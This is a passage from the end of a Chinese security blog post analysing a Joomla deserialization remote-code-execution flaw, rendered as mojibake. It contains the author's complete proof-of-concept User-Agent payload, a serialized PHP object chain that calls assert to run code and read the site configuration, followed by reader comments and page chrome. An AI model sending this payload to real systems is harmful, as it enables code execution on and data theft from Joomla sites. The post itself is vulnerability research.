<p>è€ŒJSimplepieFactoryæœ‰autoloadï¼Œæ‰€ä»¥ä¸å†éœ€è¦å…¶ä»–includeæ¥å¯¹å…¶è¿›è¡ŒåŠ è½½ã€‚</p>
<p>ç»™å‡ºæˆ‘æœ€ç»ˆæ„é€ çš„POCï¼ˆæ—¢æ˜¯ä¸Šè¿°phpä»£ç ç”Ÿæˆçš„POCï¼‰ï¼š</p>
<div class="codehilite"><pre><span></span><span class="nt">User-Agent</span><span class="o">:</span> <span class="nt">123</span><span class="err">}</span><span class="nt">__test</span><span class="o">|</span><span class="nt">O</span><span class="p">:</span><span class="nd">21</span><span class="o">:</span><span class="s2">&quot;JDatabaseDriverMysqli&quot;</span><span class="p">:</span><span class="nd">3</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="p">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&quot;\0\0\0a&quot;</span><span class="p">;</span><span class="n">O</span><span class="p">:</span><span class="mi">17</span><span class="o">:</span><span class="s2">&quot;JSimplepieFactory&quot;</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="err">{</span><span class="p">}</span><span class="nt">s</span><span class="p">:</span><span class="nd">21</span><span class="o">:</span><span class="s2">&quot;\0\0\0disconnectHandlers&quot;</span><span class="o">;</span><span class="nt">a</span><span class="p">:</span><span class="nd">1</span><span class="o">:</span><span class="p">{</span><span class="n">i</span><span class="p">:</span><span class="mi">0</span><span class="p">;</span><span class="n">a</span><span class="p">:</span><span class="mi">2</span><span class="o">:</span><span class="err">{</span><span class="n">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="n">O</span><span class="p">:</span><span class="mi">9</span><span class="o">:</span><span class="s2">&quot;SimplePie&quot;</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="err">{</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">&quot;sanitize&quot;</span><span class="p">;</span><span class="n">O</span><span class="p">:</span><span class="mi">20</span><span class="o">:</span><span class="s2">&quot;JDatabaseDriverMysql&quot;</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="err">{</span><span class="p">}</span><span class="nt">s</span><span class="p">:</span><span class="nd">5</span><span class="o">:</span><span class="s2">&quot;cache&quot;</span><span class="o">;</span><span class="nt">b</span><span class="p">:</span><span class="nd">1</span><span class="o">;</span><span class="nt">s</span><span class="p">:</span><span class="nd">19</span><span class="o">:</span><span class="s2">&quot;cache_name_function&quot;</span><span class="o">;</span><span class="nt">s</span><span class="p">:</span><span class="nd">6</span><span class="o">:</span><span class="s2">&quot;assert&quot;</span><span class="o">;</span><span class="nt">s</span><span class="p">:</span><span class="nd">10</span><span class="o">:</span><span class="s2">&quot;javascript&quot;</span><span class="o">;</span><span class="nt">i</span><span class="p">:</span><span class="nd">9999</span><span class="o">;</span><span class="nt">s</span><span class="p">:</span><span class="nd">8</span><span class="o">:</span><span class="s2">&quot;feed_url&quot;</span><span class="o">;</span><span class="nt">s</span><span class="p">:</span><span class="nd">37</span><span class="o">:</span><span class="s2">&quot;phpinfo();JFactory::getConfig();exit;&quot;</span><span class="o">;</span><span class="err">}</span><span class="nt">i</span><span class="p">:</span><span class="nd">1</span><span class="o">;</span><span class="nt">s</span><span class="p">:</span><span class="nd">4</span><span class="o">:</span><span class="s2">&quot;init&quot;</span><span class="o">;</span><span class="err">}}</span><span class="nt">s</span><span class="p">:</span><span class="nd">13</span><span class="o">:</span><span class="s2">&quot;\0\0\0connection&quot;</span><span class="o">;</span><span class="nt">i</span><span class="p">:</span><span class="nd">1</span><span class="o">;</span><span class="err">}</span><span class="nt">Ã°</span><span class="err">ÂÂŒÂ†</span>
</pre></div>


<p><a href="../content/uploadfile/201512/b3d41451235950.jpg"><img alt="14501837463659.jpg" src="../content/uploadfile/201512/thum-b3d41451235950.jpg" /></a></p>
            </div>
            <div itemprop="keywords" class="tags-meta">
                æ ‡ç­¾:
                
                    <a href="../tag/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">ååºåˆ—åŒ–æ¼æ´</a>
                
                    <a href="../tag/joomla.html">joomla</a>
                
                    <a href="../tag/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html">å‘½ä»¤æ‰§è¡Œæ¼æ´</a>
                
            </div>
            <br>
<!--MOB SHARE BEGIN-->
<div class="-mob-share-ui-button -mob-share-open">åˆ†äº«</div>
<div class="-mob-share-ui" style="display: none">
    <ul class="-mob-share-list">
        <li class="-mob-share-weibo"><p>æ–°æµªå¾®åš</p></li>
        <li class="-mob-share-qzone"><p>QQç©ºé—´</p></li>
        <li class="-mob-share-qq"><p>QQå¥½å‹</p></li>
        <li class="-mob-share-weixin"><p>å¾®ä¿¡</p></li>
        <li class="-mob-share-douban"><p>è±†ç“£</p></li>
        <li class="-mob-share-facebook"><p>Facebook</p></li>
        <li class="-mob-share-twitter"><p>Twitter</p></li>
        <li class="-mob-share-pocket"><p>Pocket</p></li>
        <li class="-mob-share-google"><p>Google+</p></li>
        <li class="-mob-share-youdao"><p>æœ‰é“äº‘ç¬”è®°</p></li>
        <li class="-mob-share-mingdao"><p>æ˜é“</p></li>
        <li class="-mob-share-tumblr"><p>Tumblr</p></li>
        <li class="-mob-share-instapaper"><p>Instapaper</p></li>
        <li class="-mob-share-linkedin"><p>LinkedIn</p></li>
    </ul>
    <div class="-mob-share-close">å–æ¶ˆ</div>
</div>
<div class="-mob-share-ui-bg"></div>
<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=af155d9007c8"></script>
<!--MOB SHARE END-->

        <div class="qqlist">
          <h3>è®¢é˜…æœ¬ç«™<small>(RSS)</small></h3>
          <form method="post" target="_blank" action="https://list.qq.com/cgi-bin/qf_compose_send">
          <input type="hidden" value="qf_booked_feedback" name="t" />
          <input type="hidden" value="dace5c2b356504de449e7f3fc2bb59f3f6124d6563786446" name="id" />
          <input type="text" placeholder="E-mail" value="" class="rsstxt" name="to" id="to" />
          <button type="submit" >è®¢é˜…&rarr;</button>
          </form>
        </div>


        </div>

        
        <div class="post-single type-post text-center">
            <h3 style="margin-top: 0">å–œæ¬¢è¿™ç¯‡æ–‡ç« ï¼Œæ‰«ç å’Œæˆ‘æˆä¸ºèµå‹ï¼</h3>
            <img src="../static/wx.jpg" width="280" alt="">
        </div>
        

        <!-- è¯„è®ºä½ç½® -->
        <div id="comments" class="comments">
          <h3>å·²æœ‰ 10 æ¡è¯„è®º</h3>
            <ol class="comment-list">
            
            
              <li class="comment-body" id="comment-2939">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="../static/placeholder.jpg">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">jianson</a></div>
                    <p>è¯·é—®ä¸€ä¸‹ï¼Œå¦‚æœä½¿ç”¨äº†ç¬¬ä¸‰æ–¹æ’ä»¶çš„è¯ï¼Œä½¿ç”¨äº†thinkphpçš„æ¡†æ¶ï¼Œåœ¨è¾“å‡ºget_classçš„æ—¶å€™æ²¡æœ‰åŠ è½½åˆ°é‚£ä¸ªç±»ï¼Œæ€ä¹ˆè¿›è¡ŒæŠŠé‚£ä¸ªæ–‡ä»¶åŒ…å«è¿›æ¥å‘¢ï¼Ÿ</p>
                    <span class="comment-time">æ—¶é—´: 2017-10-11 04:40</span>
                    <span class="comment-reply"><a href="#comment-2939" onclick="reply_to('2939','jianson')">å›å¤</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-2942">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="../index.html" target="_blank" rel="nofollow noopener">phithon</a></div>
                    <p>@jianson å¯ä»¥å‚è€ƒè¿™ä¸ª https://bugs.leavesongs.com/PHP/Phpwind-GET%E5%9E%8BCSRF%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/ ThinkPHP5æœ‰autoload</p>
                    <span class="comment-time">æ—¶é—´: 2017-10-12 20:33</span>
                    <span class="comment-reply"><a href="#comment-2942" onclick="reply_to('2942','phithon')">å›å¤</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-2364">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="../static/placeholder.jpg">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">xxx</a></div>
                    <p>ä½ å¥½ï¼Œè¯·æ•™ä¸€ä¸‹<br>1ã€è¿™ä¸ªpocæ˜¯ä¸æ˜¯åªèƒ½åœ¨3.xä¸‹çš„ç‰ˆæœ¬æ‰§è¡Œï¼Ÿ<br>2ã€é—®é¢˜1å¦‚æœæ˜¯çš„è¯ï¼Œåœ¨2.x ç‰ˆæœ¬pocå¦‚ä½•æ„é€ ï¼Œæˆ‘çœ‹äº†ä¸‹åœ¨2.xç‰ˆæœ¬ä¸‹æ²¡æœ‰jdatabasedrivermysqliç±»ï¼Œåœ¨2.xç‰ˆæœ¬ä¸jdatabasedrivermysqliç±»å¯¹åº”ç±»ä¸ºjdatabasemysqliç±»å’Œjdatabasemyssqlç±»çš„åˆ©ç”¨magic functionä¸èƒ½ç”¨äºæ„é€ popé“¾ï¼Œæ€ä¹ˆæ ·æ‰èƒ½æ‰¾åˆ°å¯ä»¥æ„é€ POPé“¾çš„ç±»?<br>     é—®é¢˜1çš„ç­”æ¡ˆå¦‚æœæ˜¯å¦çš„è¯ï¼Œä¹Ÿèƒ½åœ¨2.xç‰ˆæœ¬æˆ–è€…1.xç‰ˆæœ¬ä¸‹æ‰§è¡Œçš„è¯ï¼Œæœ‰å¯èƒ½çš„åŸå› æ˜¯ä»€ä¹ˆï¼Ÿï¼Ÿ<br>è°¢è°¢</p>
                    <span class="comment-time">æ—¶é—´: 2016-06-16 17:38</span>
                    <span class="comment-reply"><a href="#comment-2364" onclick="reply_to('2364','xxx')">å›å¤</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-2368">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="../index.html" target="_blank" rel="nofollow noopener">phithon</a></div>
                    <p>@xxxï¼šè¿™ä¸ªæˆ‘ä¹Ÿæ²¡ç ”ç©¶è¿‡ï¼Œå¸Œæœ›ä½ èƒ½å»ç ”ç©¶ä¸€ä¸‹ï¼Œå…±åŒå­¦ä¹ ~</p>
                    <span class="comment-time">æ—¶é—´: 2016-06-24 11:47</span>
                    <span class="comment-reply"><a href="#comment-2368" onclick="reply_to('2368','phithon')">å›å¤</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-2281">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="../static/placeholder.jpg">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="http://www.waitalone.cn" target="_blank" rel="nofollow noopener">ç‹¬è‡ªç­‰å¾…</a></div>
                    <p>å¤§ç‰›ï¼Œåˆ†æçš„ä¸é”™ã€‚ã€‚ã€‚å­¦ä¹ äº†ã€‚</p>
                    <span class="comment-time">æ—¶é—´: 2016-01-05 17:50</span>
                    <span class="comment-reply"><a href="#comment-2281" onclick="reply_to('2281','ç‹¬è‡ªç­‰å¾…')">å›å¤</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-2273">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/487f87505f619bf9ea08f26bb34f8118.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="http://www.23.com" target="_blank" rel="nofollow noopener">L</a></div>
                    <p>$this-&gt;connection = true;å»éªŒè¯çš„è¯<br>è¿™æ ·çš„è¯åºåˆ—åŒ–ä¹‹ååº”è¯¥æ˜¯connection&quot;;b:1;}å§</p>
                    <span class="comment-time">æ—¶é—´: 2015-12-28 17:40</span>
                    <span class="comment-reply"><a href="#comment-2273" onclick="reply_to('2273','L')">å›å¤</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-2277">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="http://www.leavesongs.com/" target="_blank" rel="nofollow noopener">phithon</a></div>
                    <p>@Lï¼šæ˜¯å§ã€‚<br>$this-&gt;connection = true;<br>å’Œ<br>$this-&gt;connection = 1;<br>æ•ˆæœéƒ½ä¸€æ ·ï¼Œæˆ‘çš„POCé‡Œç”¨çš„åè€…ã€‚</p>
                    <span class="comment-time">æ—¶é—´: 2016-01-01 15:35</span>
                    <span class="comment-reply"><a href="#comment-2277" onclick="reply_to('2277','phithon')">å›å¤</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-2272">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/6e52b9d5acf05d5d6d0dd021b81513c6.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">ä½›å±±ä¸é”ˆé’¢ç®¡</a></div>
                    <p>æ¥è®¿å•¦ï¼</p>
                    <span class="comment-time">æ—¶é—´: 2015-12-28 16:57</span>
                    <span class="comment-reply"><a href="#comment-2272" onclick="reply_to('2272','ä½›å±±ä¸é”ˆé’¢ç®¡')">å›å¤</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-2278">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/d832f116cafcd2608947371702255c2f.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">mr</a></div>
                    <p>@ä½›å±±ä¸é”ˆé’¢ç®¡ï¼šæä¸é”ˆé’¢çš„éƒ½è·Ÿæå®‰å…¨æœ‰ä¸€è…¿äº†, æœ‰ç‚¹çœ‹ä¸æ‡‚å•Š......</p>
                    <span class="comment-time">æ—¶é—´: 2016-01-02 00:31</span>
                    <span class="comment-reply"><a href="#comment-2278" onclick="reply_to('2278','mr')">å›å¤</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-2280">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/6e52b9d5acf05d5d6d0dd021b81513c6.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="http://www.fssyxc.com" target="_blank" rel="nofollow noopener">ä½›å±±ä¸é”ˆé’¢ç®¡</a></div>
                    <p>@mrï¼šå“ˆå“ˆå“ˆå“ˆã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
                    <span class="comment-time">æ—¶é—´: 2016-01-04 09:31</span>
                    <span class="comment-reply"><a href="#comment-2280" onclick="reply_to('2280','ä½›å±±ä¸é”ˆé’¢ç®¡')">å›å¤</a></span>
                    </div>
                </div>
              </li>
            
            
            </ol>
            
        </div>

        <div id="reply"></div>
        <div id="comment-place">
            <div id="comment-post" class="respond none-resize">
             <div id="respond">
                <h3 id="response">æ·»åŠ æ–°è¯„è®º</h3>
                <form method="post" id="comment-form" role="form" action="#comments">
                    <p>
                        <label for="author" class="required">ç§°å‘¼</label>
                        <input type="text" name="nickname" placeholder="æ˜µç§°" maxlength="64" required id="id_nickname">
                    </p>
                    <p>
                        <label for="mail">Email</label>
                        <input type="text" name="email" placeholder="é‚®ç®±ï¼ˆå¯ç•™ç©ºï¼‰" maxlength="254" id="id_email">
                    </p>
                    <p>
                        <label for="url">ç½‘ç«™</label>
                        <input type="text" name="url" placeholder="é“¾æ¥ï¼ˆå¯ç•™ç©ºï¼‰" maxlength="200" id="id_url">
                    </p>
                    <p>
                        <label for="textarea" class="required">å†…å®¹</label>
                        <textarea name="content" cols="40" rows="6" required id="id_content">
</textarea>
                    </p>
                    <p>
                        <label style="float:left;">éªŒè¯ç </label>
                        <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="éªŒè¯ç " /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="812e08fccf814a23277703ced053d6c3403934ca" />
</div><div class="col-6">
<img src="../captcha/image/812e08fccf814a23277703ced053d6c3403934ca/index.png" alt="captcha" class="captcha" /></div></div>
                    </p>
                    <p>
                        <button type="submit" class="submit">æäº¤è¯„è®º</button>
                        <input type="hidden" name="parent" id="id_parent">
                        <input type="hidden" name="archive" value="374" id="id_archive">
                        <input type="hidden" name="csrfmiddlewaretoken" value="Z1pwxIZlExCXxnzmYdUQj0kB9UpTPA3gLzNn5NA42TQG5VnK0eRBgtnGuhG4ocfy">
                    </p>
                </form>
                </div>
            </div>
        </div>

    </div>
    



<div  class="col-5 columns" id="sidebar" role="complementary">

  <div class="widget widget_search">
    <h3>æœç´¢</h3>
    <form action="https://www.leavesongs.com/search/" id="searchform" method="get">
        <input type="text" id="searchkey" name="keyword" value="" class="searchkey" placeholder="Search..."/>
        <button type="submit"  id="searchsubmit">Go</button>
    </form>
  </div>

  
  <div class="widget">
	<h3 class="widget-title">æœ€æ–°è¯„è®º</h3>
	<ul class="widget-list" id="recent-comment">
    
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>æœ¨æœ¨</cite>ï¼š<a href="../THINK/europe-trip-2022.html#comment-4523">è™½ç„¶ç‰©ä»·å¯¹æ¯”ä¸å‡ºä»€ä¹ˆï¼Œä½†æ˜¯è¿˜æ˜¯è§‰å¾—å¾ˆé«˜æ˜‚</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>dongdong4fei</cite>ï¼š<a href="../THINK/using-chatgpt-for-antispam.html#comment-4520">è‚¯å¾·åŸºç–¯ç‹‚æ˜ŸæœŸå››ï¼ ç–¯ç‹‚æ˜ŸæœŸå››ï¼  https://m.kfc.com.cn/wechatco...</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>dongdong4fei</cite>ï¼š<a href="../THINK/using-chatgpt-for-antispam.html#comment-4519">å°çŒªå’ªå°çŒªå’ªå°çŒªå’ª</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>sam</cite>ï¼š<a href="javascript-prototype-pollution-attack.html#comment-4518">è¿˜å¾—æ˜¯Pç¥ï¼Œæ–‡ç« ä¸€çœ‹å°±æ‡‚</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>ç¨‹åº</cite>ï¼š<a href="discuz72-sql-injection.html#comment-4517">å¾ˆä¸é”™çš„æ–‡ç« </a></div>
        </li>
    
    </ul>
  </div>

  <div class="widget widget-category">
	<h3>åˆ†ç±»</h3>
	<ul id="blogsort" class="widget-list">
    
    
    <li>
        <a href="../sort/PENETRATION.html">ç½‘ç»œå®‰å…¨<em>143</em></a>
    </li>
    
    <li>
        <a href="../sort/C.html">C/C++<em>32</em></a>
    </li>
    
    <li>
        <a href="../sort/THINK.html">å¿ƒå¾—ä¸ä½“ä¼š<em>24</em></a>
    </li>
    
    <li>
        <a href="../sort/PYTHON.html">Python<em>19</em></a>
    </li>
    
    <li>
        <a href="../sort/SHARE.html">èµ„æºåˆ†äº«<em>16</em></a>
    </li>
    
    </ul>
  </div>

  <div class="widget widget-tag">
	<h3>éšæœºæ ‡ç­¾</h3>
	<div class="tag-cloud">
        
        
        <a rel="tag" href="../tag/%E5%AE%89%E5%85%A8%E7%8B%97.html">å®‰å…¨ç‹—</a>
        
        <a rel="tag" href="../tag/md5.html">md5</a>
        
        <a rel="tag" href="../tag/%E5%A4%A7%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86.html">å¤§æ–‡ä»¶å¤„ç†</a>
        
        <a rel="tag" href="../tag/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F.html">ç«¯å£æ‰«æ</a>
        
        <a rel="tag" href="../tag/%E5%AE%A2%E6%88%B7%E7%AB%AFXSS.html">å®¢æˆ·ç«¯XSS</a>
        
        <a rel="tag" href="../tag/appcms.html">appcms</a>
        
        <a rel="tag" href="../tag/ctf.html">ctf</a>
        
        <a rel="tag" href="../tag/java.html">java</a>
        
        <a rel="tag" href="../tag/%E5%A5%BD%E7%89%A9%E6%8E%A8%E8%8D%90.html">å¥½ç‰©æ¨è</a>
        
        <a rel="tag" href="../tag/%EF%B9%AA00%E6%88%AA%E6%96%AD.html">%00æˆªæ–­</a>
        
        <a rel="tag" href="../tag/%E6%90%AC%E5%AE%B6.html">æ¬å®¶</a>
        
        <a rel="tag" href="../tag/jar%E6%89%93%E5%8C%85.html">jaræ‰“åŒ…</a>
        
        <a rel="tag" href="../tag/fineCMS.html">fineCMS</a>
        
        <a rel="tag" href="../tag/Mysql.html">Mysql</a>
        
        <a rel="tag" href="../tag/%E8%87%AA%E5%8A%A8%E8%AE%BE%E7%BD%AE.html">è‡ªåŠ¨è®¾ç½®</a>
        
        <a rel="tag" href="../tag/exe.html">exe</a>
        
        <a rel="tag" href="../tag/%E8%B7%A8%E7%9B%AE%E5%BD%95.html">è·¨ç›®å½•</a>
        
        <a rel="tag" href="../tag/WAF.html">WAF</a>
        
        <a rel="tag" href="../tag/kali.html">kali</a>
        
        <a rel="tag" href="../tag/Docker.html">Docker</a>
        
        <a rel="tag" href="../tag/%E6%8A%A5%E7%BA%B8.html">æŠ¥çº¸</a>
        
        <a rel="tag" href="../tag/2019.html">2019</a>
        
        <a rel="tag" href="../tag/string.html">string</a>
        
        <a rel="tag" href="../tag/Vulhub.html">Vulhub</a>
        
        <a rel="tag" href="../tag/%E5%BA%93%E5%87%BD%E6%95%B0.html">åº“å‡½æ•°</a>
        
        <a rel="tag" href="../tag/CSRF%E6%BC%8F%E6%B4%9E.html">CSRFæ¼æ´</a>
        
        <a rel="tag" href="../tag/%E5%8A%A0%E5%AF%86.html">åŠ å¯†</a>
        
        <a rel="tag" href="../tag/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.html">ç«¯å£è½¬å‘</a>
        
        <a rel="tag" href="../tag/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE.html">å¼€æºé¡¹ç›®</a>
        
        <a rel="tag" href="../tag/ipv6.html">ipv6</a>
        
    </div>
  </div>

  <div class="widget widget-recent-entries">
	<h3 class="widget-title">çƒ­é—¨æ—¥å¿—</h3>
	<ul id="hotlog" class="widget-list">
    
    
        <li><a href="../other/tinger.html">About.Me</a></li>
    
        <li><a href="detect-django.html">å¦‚ä½•åˆ¤æ–­ç›®æ ‡ç«™ç‚¹æ˜¯å¦ä¸ºDjangoå¼€å‘</a></li>
    
        <li><a href="webshell-without-alphanum-advanced.html">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡</a></li>
    
        <li><a href="webshell-without-alphanum.html">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell</a></li>
    
        <li><a href="php-filter-magic.html">è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨</a></li>
    
    </ul>
  </div>
  

</div>
</div>

<div id="footer">
	<!-- copyright -->
	<div class="container">
		<div class="row remove-bottom">
			<div class="col-6 columns">
			<h3>Little About</h3>
			<p>Phithon éå¼ºè¿«ç—‡å°é’å¹´  <br>
ç°å±…å…ˆ <br>
çˆ±å¥½ï¼šç§èŠ±ã€ä¹°ä¹¦ã€æ”¶è—æ˜ä¿¡ç‰‡ <br>
æ¬¢è¿å„å¤§ç»„ç»‡æ”¶ç•™ <br>
E-mailï¼šroot@leavesongs.com </p>
			</div>

			<div class="col-10 columns">

				<h3 class="mobile-hide">Follow me</h3>
        <div id="social-links">
          <a href="http://weibo.com/101yx" class="sweibo" target="_blank" title="æ–°æµªå¾®åš">æ–°æµªå¾®åš</a>
          <a href="javascript:alert(/æ²¡æœ‰è…¾è®¯å¾®åšå“Ÿ/)" class="qweibo" target="_blank" title="è…¾è®¯å¾®åš">è…¾è®¯å¾®åš</a>
          <a href="javascript:alert(/å¢™å¤–æœ‰ä»€ä¹ˆ/);window.open('http://google.com')" class="google" target="_blank" title="å¢™å¤–çš„ä¸–ç•Œ">google+</a>
          <a href="https://github.com/phith0n" class="github" target="_blank" title="Github">github</a>
          <a href="javascript:confirm(/mailto:root#leavesongs.com/)" class="mail" target="_blank" title="ç§ä¿¡ç»™æˆ‘">ç§ä¿¡ç»™æˆ‘</a>
          <a href="../feed/index.rss" target="_blank" class="rss" title="ç¦»åˆ«æ­Œ">RSSè®¢é˜…</a>
        </div>
        <div class="bot-line"></div>
				<p class="copyright">
	Copyright &copy; Powered by talkbook
				&nbsp;&nbsp;<i>Designed and built with all the love in the world by <a href="../index.html" target="_blank">Phithon</a> && deepsky </i>
                    <a href="../index.html">æ›´æ¢æ¨¡æ¿</a>
				</p>
			</div>
		</div>
	</div>
	<!-- /copyright -->
</div>
<a href="#" id="go-top">Top â†‘</a>
<script src="https://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/jquery.appear/0.4.1/jquery.appear.min.js"></script>
<script src="../static/deep/js/common_tpl.js" type="text/javascript"></script>
<script src="../static/deep/js/config.js"></script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-FF5KPQ1CZ6');
</script>

<script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
<script>
$(document).ready(function () {
    $(".entry a").each(function (i, e) {
        if(e.host != 'www.leavesongs.com') {
            e.target = '_blank';
        }
    });
    $(".entry img").each(function (i, e) {
        if(e.parentNode.tagName.toUpperCase() != 'A') {
            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
        } else {
            $(e.parentNode).addClass('fancybox');
        }
    });
    $('.fancybox').fancybox();
})
</script>

</body>

</html>